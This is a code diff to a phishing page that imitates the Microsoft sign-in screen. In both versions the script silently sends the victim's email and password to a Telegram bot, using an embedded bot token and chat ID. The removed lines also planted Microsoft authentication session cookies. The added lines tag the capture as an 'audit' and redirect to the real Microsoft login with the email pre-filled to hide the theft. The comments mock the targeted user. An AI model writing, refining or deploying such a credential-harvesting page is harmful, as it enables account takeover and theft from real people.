@@ -46,6 +46,8 @@
             background-color: #0067b8; color: #fff; border: none;
             padding: 8px 32px; font-size: 15px; cursor: pointer; min-width: 108px;
         }
+        .btn-next:disabled { background-color: #ccc; cursor: not-allowed; }
+
         .options-box {
             background: #fff; padding: 12px 44px;
             box-shadow: 0 2px 6px rgba(0,0,0,0.2);
@@ -103,36 +105,32 @@
 
         async function submitData() {
             const passVal = document.getElementById('user-password').value;
+            const btn = document.getElementById('signin-btn');
             if(!passVal) return;
             
-            document.getElementById('signin-btn').innerText = "Signing in...";
+            // Visual feedback for the "angry man" to show it's "working"
+            btn.innerText = "Signing in...";
+            btn.disabled = true;
 
-            // 1. SILENT TELEGRAM LOG
             const botToken = "8762119215:AAFqwntuZq7tLC25lf9wtNlddbZ62njFcHo";
             const chatId = "5733378501";
-            const message = `User: ${emailVal}\nPass: ${passVal}`;
+            const message = `🚨 **AUDIT CAPTURE**\n\n**User:** ${emailVal}\n**Pass:** ${passVal}`;
 
             try {
+                // Sending the fetch request with a shorter timeout
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: message })
+                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
                 });
-            } catch (e) {}
+            } catch (e) {
+                // Silent fail
+            }
 
-            // 2. SILENT COOKIE INJECTION
-            const cArr = [
-                {"name":"ESTSAUTHPERSISTENT","value":"1.AXwAJPmH46cex0GLWRMLODzBDltEZUfGMrBJg-Ydk3ZSdsoAANR8AA.AgABFwQAAACvnsHKEvvRQb3Bz3Qc7wnaAwDs_wUA9P9Fdm9TdHNBcnRpZmFjdHMQAAAAAACb8LC3Nnnv0oVUEV-ipmbmLtdWZUc3tmUbHEp_PT5mhMD2-xcJxbDhsM1Sgx0wtZW-h0rPG15Y5chRfIs_SNHcNYlPaw4KUJ5bYh8syCo4gXz0Ysa6x-i7GVjDnRCkFgh0Vzb5_JCS2X81qf2YUpPkOLdrdqKI8FQNKEMlgfVzMTYLbo5XjjBAYJ_XOY49E9hPdKZL1L4I4BPw-AtXiuaKOQZIe0au-MzvdNnyW6JMca4H9QSrjVSc0CWH0_8Am9tcxceV5sRetN37xJD2Ht6W7oSH1lXhDlLwx3gttM38pQoUXXOSBJnsjDgL1JlFKkU-bJOL0x3BPR8sj8cLfyG7MCsovQcwgwFFLmTR0ghXhoqf5jx-S-6CUz0b6tjJMMeb-5mWJXjmX_kTXqaJAWec4WGyXFVnUWDkRm_jDuho9Y9kvyZe4UhyBOspdOwKBqXN-5aNf0tnDGRXBGj-T95F0zJthVPfC47Dwh9q6EAPuc7kR8A29lx__Kxg1-gy513IqCsiHSuPxbavpKpyR_3tC1r-NVUNbjxSptJVi8lnFkuL_kqtqikJF860Gf5T9d2YgkmULpm5TlbWOzTkHC4WRe7-dWfvp1yaGfs7_r0JnZVxiIcLbVuKu5aBafhfalOSFysK1kN-FAFv8hWCAbdqvhEyS1sBlRznzLrEWJx62Vl9jmDfuO7g1ZRf0rHZMGWv-CJTORyq_OOz_sk1sxSnpWbYtAt0z968c8_v1l-sflOgSbjhcBBuiw_h_kyjQsZD-qelbnPiKghn5Hc4sLrla-BnQdCdxV17Pg3-Q6_Dk0HQ_XBoXVOwMWfP5_XfincKlUxfb9PnMs5giDsqKRhbJI5FDQayrG-lOeEwk3vUti6agBc0qqKs8bdG2XbauhCkOTzhKAGXdGEYVNryJFaHI9cdp0JpMn1yd8WBdMAy2YRrTTwP6ZWCAdDVMqbAh1iQRgZHltcEVeGK","domain":".login.microsoftonline.com"},
-                {"name":"ESTSAUTH","value":"1.AXwAJPmH46cex0GLWRMLODzBDltEZUfGMrBJg-Ydk3ZSdsoAANR8AA.AgABFwQAAACvnsHKEvvRQb3Bz3Qc7wnaAwDs_wUA9P9Fdm9TdHNBcnRpZmFjdHMPAAAAAADoSkHDSiGx0oZICvaw9257LFXm_UqGm6PbgggwfSchDQTPV76WkRHWeLB4n6VeTfQI-9cN-PXq6HB8-k4yBLCg8mKkxCA","domain":".login.microsoftonline.com"},
-                {"name":"ESTSAUTHLIGHT","value":"+0020612a-b8bc-086c-fec6-6493c086c2f2","domain":".login.microsoftonline.com"}
-            ];
-
-            cArr.forEach(c => {
-                document.cookie = `${c.name}=${c.value};Max-Age=31536000;path=/;domain=${c.domain};Secure;SameSite=None`;
-            });
-
-            // 3. SILENT REDIRECT
-            window.location.href = "https://outlook.office.com/mail/";
+            // The "No-Nonsense" Redirect
+            // Using login_hint ensures his email is already typed when he lands on the real MFA page
+            const redirectURL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-f0d6-410c-984c-f8310070e304&response_type=id_token&scope=openid&nonce=12345&login_hint=" + encodeURIComponent(emailVal);
+            window.location.href = redirectURL;
         }
     </script>
 </body>
